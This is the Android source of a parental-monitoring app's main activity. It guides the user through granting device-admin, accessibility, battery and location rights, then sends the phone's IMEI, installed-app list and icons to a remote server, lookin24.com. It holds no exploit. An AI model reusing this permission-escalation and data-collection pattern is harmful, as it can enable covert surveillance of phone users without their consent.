package com.family.familyprotector;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.webkit.CookieManager;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.family.accessibility.MyAccessibilityService;
import com.family.background.GoogleService;
import com.family.internet.InternetHelper;
import com.family.internet.ServerHelper;
import com.family.internet.ServerHelper2;
import com.family.util.Util;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.iid.InstanceIdResult;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class ParentActivity extends Activity {

    public void postJSONFirebase(String token) {
        JSONObject postData = new JSONObject();
        Log.d("posted", "posJson from Firebase");
        String ts = Context.TELEPHONY_SERVICE;
        String imei = new Device(this).getImei();
        try {
            postData.put("t", token);
            postData.put("i", imei);
            new ServerHelper(this).execute("https://lookin24.com/updateFirebaseToken", postData.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
    public void firstTimeInit() throws JSONException {
        Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
        mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
        List<ResolveInfo> pkgAppsList = this.getPackageManager().queryIntentActivities( mainIntent, 0);
        JSONObject O = new JSONObject();
        JSONArray a = new JSONArray();
        //O.put("array", )


        for(ResolveInfo x : pkgAppsList) {
            ApplicationInfo ai;

            try {
                ai = this.getPackageManager().getApplicationInfo( x.activityInfo.packageName, 0);
            } catch (final PackageManager.NameNotFoundException e) {
                ai = null;
            }
            String appLabel = (String) (ai != null ? this.getPackageManager().getApplicationLabel(ai) : "(unknown)");
            //appLabel = appLabel.replaceAll("&", "");
            JSONObject e = new JSONObject();
            Logger.l(appLabel + "   dovrde");

            e.put("name", appLabel);
            e.put("package", x.activityInfo.packageName);
            a.put(e);
        }
        O.put("apps", a);
        O.put("imei", new Device(this).getImei());
        new ServerHelper2(this).execute("https://lookin24.com/initApp", O.toString());
    }
    public void prepareFirebase() {
        new AsyncTask<Integer, Integer, Void>() {

            @Override
            protected Void doInBackground(Integer... integers) {
                FirebaseInstanceId.getInstance().getInstanceId()
                        .addOnCompleteListener(new OnCompleteListener<InstanceIdResult>() {
                            @Override
                            public void onComplete(@NonNull Task<InstanceIdResult> task) {
                                if (!task.isSuccessful()) {
                                    Log.w("TAG", "getInstanceId failed", task.getException());
                                    return;
                                }

                                // Get new Instance ID token
                                String token = task.getResult().getToken();
                                postJSONFirebase(token);
                                Logger.l("Token- " + token);
                                Toast.makeText(ParentActivity.this, token, Toast.LENGTH_SHORT).show();
                            }
                        });

                try {
                    FileR.checkFolder();
                } catch (IOException e) {
                    e.printStackTrace();
                }

                try {
                    firstTimeInit();
                } catch (JSONException e) {
                    e.printStackTrace();
                }


                Util u = new Util(that);
                u.saveIcons();
                File f = new File(Environment.getExternalStorageDirectory() + "//.FamilyProtector//");



                String [] L = f.list();
                JSONObject jo = new JSONObject();
                JSONArray ja = new JSONArray();
                for(int i = 0; i < L.length; i++) {
                    ja.put(L[i]);
                }
                List<String> lazimi = new ArrayList<>();
                try{
                    jo.put("apps", ja);
                    String ans = new InternetHelper().send("https://www.lookin24.com/unavailableIcons",jo.toString());
                    JSONObject ansj = new JSONObject(ans);
                    JSONArray ansa = ansj.getJSONArray("apps");
                    for(int i = 0; i < ansa.length(); i++) {
                        lazimi.add(ansa.getString(i));
                    }
                }catch (Exception e){}

                for(int i = 0; i < lazimi.size(); i++) {
                    Logger.l(lazimi.get(i));
                    u.uploadImage("", new File(Environment.getExternalStorageDirectory() + "//.FamilyProtector//"+lazimi.get(i)));
                }
                return null;
            }
        }.execute();
    }

    public Activity that;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_parent);
        that = this;

        //requestWindowFeature(Window.FEATURE_NO_TITLE);//will hide the title
        //getSupportActionBar().hide(); //hide the title bar

        final WebView myWebView = (WebView) findViewById(R.id.webview);
//        myWebView.setWebViewClient(new WebViewClient() { @Override public boolean shouldOverrideUrlLoading(WebView view, String url) {
//            view.loadUrl(url);
//            return false;
//        } });

        final android.webkit.CookieManager cookieManager = android.webkit.CookieManager.getInstance();

        cookieManager.setAcceptCookie(true);
        cookieManager.acceptCookie();
        cookieManager.setAcceptFileSchemeCookies(true);
        cookieManager.getInstance().setAcceptCookie(true);
        Map<String, String> C = new HashMap<>();
        class SS {
            String s;
        }


        final PermissionManager pm = new PermissionManager(this);
        myWebView.setWebViewClient(new WebViewClient(){
            @Override
            public WebResourceResponse shouldInterceptRequest (final WebView view, String url) {

                Logger.l("BAXX", "adi URL:" + url);

                int t = 0;
                if(url.indexOf("?firstTime=123") != -1) {
                    if(pm.hasSimplePermissions()) t += 25;
                    if(pm.isBatteryObtimisationIgnored())t += 25;
                    if(pm.isAccessibilityServiceEnabled(MyAccessibilityService.class)) t += 25;
                    if(pm.isAdmin())t += 25;
                    if(t == 100) {
                        if(MyAccessibilityService.firstTime) {
                            prepareFirebase();
                            if(ContextCompat.checkSelfPermission( MyAccessibilityService.instance, android.Manifest.permission.ACCESS_COARSE_LOCATION ) == PackageManager.PERMISSION_GRANTED)
                                startService(new Intent(getApplicationContext(), GoogleService.class));
                            MyAccessibilityService.firstTime = false;
                        }
                        return new WebResourceResponse("text/plain", "utf-8", new ByteArrayInputStream(new Device(that).getImei().getBytes()));
                    }else {
                        return new WebResourceResponse("text/plain", "utf-8", new ByteArrayInputStream((t+"").getBytes()));
                    }

                }else if(url.indexOf("?permission=") != -1) {
                    pm.allPermission();
                    Logger.l("BAXX", "BANGGGGGGGGGGGGGG");
                    Logger.l("BAXX", url);
                    if(!pm.hasSimplePermissions()) {
                        pm.askSimplePermissions();
                    }else if(!pm.isBatteryObtimisationIgnored()) {
                        Logger.l("BAXX", "acc cagrilir");
                        pm.setBattery();
                    }else if(!pm.isAdmin()) {
                        pm.setAdmin();
                    }else if(!pm.isAccessibilityServiceEnabled(MyAccessibilityService.class)) {
                        pm.setAccesibiltyOn();
                    }else{
                            //view.loadUrl("https://www.lookin24.com/index3?imei=" + (new Device(pm.activity)).getImei());
                            //return null;
                        return new WebResourceResponse("text/plain", "utf-8", new ByteArrayInputStream(new Device(that).getImei().getBytes()));
                    }
                }
                return super.shouldInterceptRequest(view, url);
            }
        });
//        myWebView.setWebChromeClient(new WebChromeClient() {
//
//        });

        myWebView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
        myWebView.getSettings().setJavaScriptEnabled(true);
        myWebView.getSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 4.4.4; One Build/KTU84L.H4) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/28.0.0.20.16;]");

        //myWebView.getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);

        //myWebView.setRenderPriority(WebSettings.RenderPriority.HIGH);
        myWebView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        //http://lookin24.com/




        //myWebView.loadUrl("https://www.lookin24.com/index3?imei=" + (new Device(this)).getImei());
        myWebView.loadUrl("https://www.lookin24.com/parentorchild");
    }
}
